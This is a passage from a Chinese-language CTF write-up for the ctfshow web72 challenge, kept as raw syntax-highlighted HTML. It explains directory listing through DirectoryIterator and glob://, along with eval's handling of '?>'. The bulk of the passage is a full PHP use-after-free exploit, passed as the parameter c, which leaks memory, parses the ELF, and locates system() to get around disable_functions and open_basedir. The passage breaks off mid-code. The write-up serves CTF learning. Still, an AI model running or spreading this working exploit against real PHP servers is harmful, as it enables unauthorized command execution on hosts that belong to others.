punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>仔细看看这个代码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob:///*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment"># 利用DirectoryIterator($path)可以实现遍历目录下的所有文件</span><span class="token comment"># glob:// — 查找匹配的文件路径模式</span><span class="token comment"># DirectoryIterator("glob:///*")   遍历根目录里所有文件</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span>  <span class="token comment">#循环遍历输出，并以空格为分隔</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>其实不加前面<code>?&gt;&lt;?php</code>也是可以的。eval里的语句可以视为在当前php文件里加了几条语句，这些语句必须是完整的，即必须以<code>;</code>或者<code>?&gt;</code>结尾来结束语句，但是eval里的?&gt;不会闭合当前的php文件，所以当前php页面后续的语句都是会执行的。</p><p>可以看一下下面的图片，eval里的语句可以修改文件的变量值，但是<code>?&gt;</code>并不会闭合外面的PHP语句。<br><img src="web72.png" alt="在这里插入图片描述" loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">function</span> <span class="token function-definition function">ctfshow</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">,</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Vuln</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">global</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>         <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">getTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token function">debug_backtrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">str2ptr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$address</span> <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token variable">$address</span> <span class="token operator">|=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">ptr2str</span><span class="token punctuation">(</span><span class="token variable">$ptr</span><span class="token punctuation">,</span> <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$m</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$ptr</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ptr</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$v</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$p</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$leak</span> <span class="token operator">%=</span> <span class="token number">2</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$leak</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$e_type</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$e_phoff</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$e_phentsize</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$e_phnum</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$e_phnum</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$e_phoff</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token variable">$e_phentsize</span><span class="token punctuation">;</span>        <span class="token variable">$p_type</span>  <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$p_flags</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$p_vaddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$p_memsz</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token variable">$data_addr</span> <span class="token operator">=</span> <span class="token variable">$e_type</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token variable">$p_vaddr</span> <span class="token punctuation">:</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$p_vaddr</span><span class="token punctuation">;</span>            <span class="token variable">$data_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token variable">$text_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data_addr</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$text_size</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$data_size</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$elf</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$data_size</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x746e6174736e6f63</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x786568326e6962</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$data_addr</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$binary_leak</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">==</span> <span class="token number">0x10102464c457f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$addr</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$basic_funcs</span><span class="token punctuation">;</span>    <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$f_entry</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$f_name</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f_name</span> <span class="token operator">==</span> <span class="token number">0x6d6574737973</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$addr</span> <span class="token operator">+=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">trigger_uaf</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$vuln</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$vuln</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$arg</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token constant">PHP_OS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'WIN'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'This PoC is for *nix systems only.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$n_alloc</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token variable">$contiguous</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n_alloc</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token variable">$contiguous</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">trigger_uaf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">;</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">79</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"UAF failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$closure_handlers</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$php_heap</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$abc_addr</span> <span class="token operator">=</span> <span class="token variable">$php_heap</span> <span class="token operator">-</span> <span class="token number">0xc8</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$closure_obj</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$binary_leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_handlers</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't determine binary base address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$elf</span> <span class="token operator">=</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't parse ELF header"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span 